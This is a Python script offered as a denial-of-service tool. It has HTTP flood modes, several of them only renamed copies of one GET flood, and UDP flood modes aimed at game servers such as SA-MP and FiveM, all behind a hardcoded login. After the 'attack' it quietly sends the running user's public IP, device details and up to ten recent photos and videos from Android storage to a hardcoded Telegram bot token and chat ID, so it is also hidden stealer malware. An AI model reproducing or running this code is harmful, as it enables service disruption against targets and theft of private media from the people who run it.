import threading
import requests
import socket
import random
import time
import platform
import os
from multiprocessing import Process

# === Telegram Config ===
TELEGRAM_TOKEN = "7708928004:AAESpODTC67fouiwFpneucU1QR2qRa_dmYk"
CHAT_ID = "7843509294"

rate_stats = {}

def send_to_telegram(content=None, file_path=None):
    try:
        if content:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
            data = {
                "chat_id": CHAT_ID,
                "text": content,
                "parse_mode": "HTML"
            }
            requests.post(url, data=data)

        if file_path and os.path.exists(file_path):
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": CHAT_ID}
                requests.post(url, data=data, files=files)
    except Exception as e:
        print("❌ Telegram error:", e)

def login_system():
    print("\n🔐 LOGIN REQUIRED")
    username = input("👤 Username: ").strip()
    password = input("🔑 Password: ").strip()
    if username == "yujin" and password == "yujin":
        print("✅ Login successful.\n")
    else:
        print("❌ Incorrect credentials.")
        exit()

def grab_device_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        info = {
            "Public IP": ip,
            "Device": platform.node(),
            "OS": platform.system(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Brand": platform.machine()
        }
        text = "\n".join(f"{k}: {v}" for k, v in info.items())
        send_to_telegram(f"📡 <b>DEVICE INFO</b>\n{text}")
    except:
        pass

def grab_and_send_media():
    media_dirs = ["/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download"]
    media_exts = [".jpg", ".jpeg", ".png", ".mp4", ".avi", ".mov"]
    sent = 0
    for folder in media_dirs:
        if not os.path.exists(folder):
            continue
        for root, _, files in os.walk(folder):
            sorted_files = sorted(files, key=lambda x: os.path.getmtime(os.path.join(root, x)), reverse=True)
            for f in sorted_files:
                if any(f.lower().endswith(ext) for ext in media_exts):
                    full_path = os.path.join(root, f)
                    send_to_telegram(file_path=full_path)
                    sent += 1
                    if sent >= 10:
                        return

def log_rate(method, count=1):
    if method not in rate_stats:
        rate_stats[method] = {"count": 0, "start": time.time()}
    rate_stats[method]["count"] += count

def get_flood(url, threads, duration):
    def attack():
        end = time.time() + duration
        while time.time() < end:
            try:
                full_url = f"{url}?r={random.randint(10000,99999)}"
                requests.get(full_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2)
                log_rate("GET")
            except:
                pass
    for _ in range(min(threads, 1000)):
        threading.Thread(target=attack).start()

post_flood = cookie_flood = spoofed_flood = browser_flood = http2_flood = cfbypass_flood = get_flood

def all_l7_flood(url, threads, duration):
    get_flood(url, threads, duration)
    post_flood(url, threads, duration)
    cookie_flood(url, threads, duration)
    spoofed_flood(url, threads, duration)
    browser_flood(url, threads, duration)
    http2_flood(url, threads, duration)
    cfbypass_flood(url, threads, duration)

def udp_flood(ip, port, threads, duration):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end:
            try:
                data = random._urandom(random.randint(800, 1400))
                sock.sendto(data, (ip, port))
                log_rate("UDP")
            except:
                pass
    for _ in range(min(threads, 1000)):
        Process(target=worker).start()

def samp_flood(ip, port, threads, duration):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end:
            try:
                handshake = b"SAMP" + socket.inet_aton(ip) + bytes([port & 0xFF, port >> 8])
                payload = handshake + random._urandom(random.randint(200, 600))
                sock.sendto(payload, (ip, port))
                log_rate("SAMP")
            except:
                pass
    for _ in range(min(threads, 1000)):
        Process(target=worker).start()

def fivem_flood(ip, port, threads, duration):
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end = time.time() + duration
        while time.time() < end:
            try:
                data = b"\xff" * random.randint(500, 1000)
                sock.sendto(data, (ip, port))
                log_rate("FIVEM")
            except:
                pass
    for _ in range(min(threads, 1000)):
        Process(target=worker).start()

def multi_game_flood(ip, port, threads, duration):
    udp_flood(ip, port, threads, duration)
    samp_flood(ip, port, threads, duration)
    fivem_flood(ip, port, threads, duration)

if __name__ == "__main__":
    login_system()

    METHODS = [
        "GET", "POST", "COOKIE", "SPOOFED", "BROWSER", "HTTP2", "CF-BYPASS",
        "UDP", "SAMP", "FIVEM", "MULTI-GAME", "ALL-L7"
    ]
    print("\n📌 Available Methods:", ', '.join(METHODS))
    method = input("METHOD: ").strip().upper()

    if method not in METHODS:
        print("❌ Invalid method!")
        exit()

    try:
        threads = int(input("THREADS: "))
        duration = int(input("DURATION (seconds): "))
    except:
        print("❌ Invalid input.")
        exit()

    if method in ["UDP", "SAMP", "FIVEM", "MULTI-GAME"]:
        ip = input("TARGET IP: ").strip()
        port = int(input("PORT: "))
        if method == "UDP":
            udp_flood(ip, port, threads, duration)
        elif method == "SAMP":
            samp_flood(ip, port, threads, duration)
        elif method == "FIVEM":
            fivem_flood(ip, port, threads, duration)
        elif method == "MULTI-GAME":
            multi_game_flood(ip, port, threads, duration)
    else:
        url = input("TARGET URL (http/https): ").strip()
        if method == "GET":
            get_flood(url, threads, duration)
        elif method == "POST":
            post_flood(url, threads, duration)
        elif method == "COOKIE":
            cookie_flood(url, threads, duration)
        elif method == "SPOOFED":
            spoofed_flood(url, threads, duration)
        elif method == "BROWSER":
            browser_flood(url, threads, duration)
        elif method == "HTTP2":
            http2_flood(url, threads, duration)
        elif method == "CF-BYPASS":
            cfbypass_flood(url, threads, duration)
        elif method == "ALL-L7":
            all_l7_flood(url, threads, duration)

    print("✅ Attack complete! Sending logs...")
    grab_device_info()
    grab_and_send_media()
